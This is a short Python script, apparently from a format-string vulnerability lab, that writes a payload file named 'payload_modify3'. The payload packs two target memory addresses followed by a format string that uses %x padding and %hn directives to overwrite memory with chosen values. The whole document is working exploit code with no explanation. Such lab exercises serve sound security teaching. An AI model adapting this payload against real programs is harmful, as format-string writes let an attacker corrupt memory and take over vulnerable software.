#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray()

number1 = 0x0804a02a
content[0:4] = (number1).to_bytes(4,byteorder='little')
dummy_number = 0x11111111
content[4:8] = (dummy_number).to_bytes(4,byteorder='little')
number2 = 0x0804a028
content[8:12] = (number2).to_bytes(4,byteorder='little')

# 45 = BUF_SIZE / 4 + 4 - 1

s = "." + "%.8x."*45 + "%.1889x.%hn%.45824x%hn" #0x0904bc04
# s = "." + "%.8x."*45 + "%.1889x.%hn"

# The line shows how to store the string s at offset 4
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
file = open("payload_modify3", "wb")
file.write(content)
file.close()
